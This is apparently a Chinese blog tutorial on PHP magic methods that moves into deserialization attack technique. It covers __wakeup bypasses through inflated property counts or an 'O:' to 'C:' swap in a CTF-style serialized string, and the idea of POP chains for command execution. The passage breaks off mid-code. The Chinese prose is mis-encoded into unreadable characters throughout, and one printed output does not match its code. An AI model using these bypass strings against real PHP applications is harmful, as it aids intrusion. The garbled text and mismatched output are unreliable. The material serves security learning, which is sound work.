class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure><p><code>__get</code>é­”æœ¯æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨ç€è®¿é—®ä¸å­˜åœ¨çš„å±æ€§å€¼ã€‚</p><hr><h4 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h4><p>ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>set</strong>è·Ÿ<strong>get</strong>ç›¸åï¼Œä¸€ä¸ªæ˜¯è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œä¸€ä¸ªæ˜¯ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼ã€‚</p><hr><p>__isset</p><p>å¯¹<strong>ä¸å¯è®¿é—®å±æ€§</strong>ï¼ˆæ¯”å¦‚privateçš„å±æ€§ï¼‰è°ƒç”¨ <strong>isset()</strong> æˆ– <strong>empty()</strong> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure><p>è¯¥é­”æœ¯æ–¹æ³•ä½¿ç”¨äº†<strong>isset()<strong>æˆ–è€…</strong>empty()<strong>åªè¦å±æ€§æ˜¯</strong>private</strong>æˆ–è€…ä¸å­˜åœ¨çš„éƒ½ä¼šè§¦å‘ã€‚</p><hr><h4 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h4><p>å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <strong>unset()</strong> æ—¶ï¼Œ**__unset()** ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†é­”æœ¯æ–¹æ³• <code>__unset()</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <strong>unset()</strong> å‡½æ•°æ¥é”€æ¯ç±»çš„ç§æœ‰çš„å±æ€§ï¼Œæˆ–åœ¨é”€æ¯ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶å¾—åˆ°é€šçŸ¥ã€‚</p><hr><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>serialize()</strong> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡è½½åºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// è¿”å›éœ€è¦åºåˆ—åŒ–çš„å˜é‡åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œåºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>sleep()å‡½æ•°ï¼Œä¸Šé¢</strong>sleepçš„å‡½æ•°ä½œç”¨æ˜¯è¿‡æ»¤æ‰passwordçš„å˜é‡å€¼ã€‚</p><hr><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p><p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ååºåˆ—åŒ–åè°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>wakeup()å‡½æ•°ï¼Œä¸Šé¢</strong>wakeupçš„å‡½æ•°ä½œç”¨æ˜¯å°†usernameçš„å˜é‡å€¼èµ‹å€¼ç»™passwordå˜é‡ã€‚</p><hr><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p><strong>__toString()</strong> æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString</span><br></pre></td></tr></table></figure><p>ç‰¹åˆ«æ³¨æ„__toStringçš„è§¦å‘æ¡ä»¶ï¼Œå¼•ç”¨k0rz3nå¸ˆå‚…çš„ç¬”è®°ï¼š</p><blockquote><p>(1)echo ($obj) &#x2F; print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ (2)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ (3)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ (4)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ (5)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ (6)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ (7)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ (8)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</p></blockquote><hr><h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<code>__invoke()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚(æœ¬ç‰¹æ€§åªåœ¨ PHP 5.1.0 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure><hr><h4 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h4><p>å½“ä½¿ç”¨ clone å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• <code>__clone()</code> ï¼Œå¦‚æœè¯¥é­”æœ¯æ–¹æ³•å­˜åœ¨çš„è¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure><hr><h3 id="wakeup-å‡½æ•°ç»•è¿‡æ¼æ´åŸç†"><a href="#wakeup-å‡½æ•°ç»•è¿‡æ¼æ´åŸç†" class="headerlink" title="__wakeup()å‡½æ•°ç»•è¿‡æ¼æ´åŸç†"></a>__wakeup()å‡½æ•°ç»•è¿‡æ¼æ´åŸç†</h3><h4 id="1-ä½ç‰ˆæœ¬çš„php"><a href="#1-ä½ç‰ˆæœ¬çš„php" class="headerlink" title="1.ä½ç‰ˆæœ¬çš„php"></a>1.ä½ç‰ˆæœ¬çš„php</h4><blockquote><p><code>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p><p><code>ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p></blockquote><h4 id="2-é«˜ä¸€äº›çš„ç‰ˆæœ¬"><a href="#2-é«˜ä¸€äº›çš„ç‰ˆæœ¬" class="headerlink" title="2.é«˜ä¸€äº›çš„ç‰ˆæœ¬"></a>2.é«˜ä¸€äº›çš„ç‰ˆæœ¬</h4><p>ä¸¾ä¸ªä¾‹å­ï¼Œ</p><blockquote><p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p></blockquote><p>å…³é”®æ˜¯æŠŠ<code>O:</code>æ”¹æˆ<code>C:</code>ï¼Œ</p><p><strong>åŸç†æ˜¯</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>ä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œè€Œserializeableä¸æ”¯æŒ__wakeupï¼Œå°±ç»•è¿‡å»äº†</span><br></pre></td></tr></table></figure><h3 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h3><blockquote><p>å®é™…ç¯å¢ƒä¸­ä¸å¯èƒ½å­˜åœ¨ç›´æ¥ååºåˆ—åŒ–å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°æˆ‘ä»¬åˆšå­¦åˆ°çš„ä¸€äº›<code>é­”æœ¯æ–¹æ³•</code>çš„ç›¸äº’è§¦å‘ï¼Œæ¥æ„é€ ä¸€æ¡popchainï¼Œä»ååºåˆ—åŒ–æ¥å£å¼€å§‹ï¼Œ<strong>ä¸€çº§ä¸€çº§çš„è§¦å‘</strong>ã€æ‰€ä»¥å°±éœ€è¦æ¸…æ¥šå„ä¸ªé­”æœ¯æ–¹æ³•çš„è§¦å‘æƒ…å†µã€‘ï¼Œæœ€ç»ˆåˆ°è¾¾æˆ‘ä»¬ç›®çš„æƒ³è¦æ‰§è¡Œçš„<code>æ–¹æ³•/å‡½æ•°</code></p></blockquote><hr><h3 id="ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"><a href="#ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥" class="headerlink" title="*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"></a>*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥</h3><p>ä¸¾ä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span 